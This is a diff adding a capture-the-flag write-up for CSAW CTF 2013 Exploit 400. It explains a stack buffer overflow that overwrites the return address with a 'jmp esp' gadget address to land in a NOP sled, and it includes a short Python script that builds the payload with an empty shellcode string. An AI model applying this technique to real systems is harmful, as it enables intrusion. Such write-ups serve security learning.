@@ -1,0 +1,22 @@
+CSAW CTF 2013 - Exploit 400
+================================
+
+This challenge was a service reading prompting some data, doing some stuff and then exiting. The file was stripped, was partly written in assembly and staticly linked. After doing some test we found that inputting a lot of data would result in a segmentation fault. If we wrote enough data, we could actually rewrite the return value and jump anywhere in the code. All we needed was then to jump on our shellcode in the buffer.
+
+There were some `jmp esp` in the file we could use, so we just had to use it to jump in the stack and execute our shellcode. $esp wasn't pointing to the buffer, but by writing a nop slope and then the shellcode right before the return adresse, a jump on $esp would lead to our shellcode.
+
+The exploit script was:
+```
+#!/usr/bin/env python
+
+from struct import pack
+shellcode = ""
+
+def exploitffe4():
+  ret_off = 417
+  off_send = pack("I", 0x080DE74F) # jmp esp location
+  payload = '\x90' * (ret_off - len(shellcode)) + shellcode + off_send
+  print(payload)
+
+exploitffe4()
+```
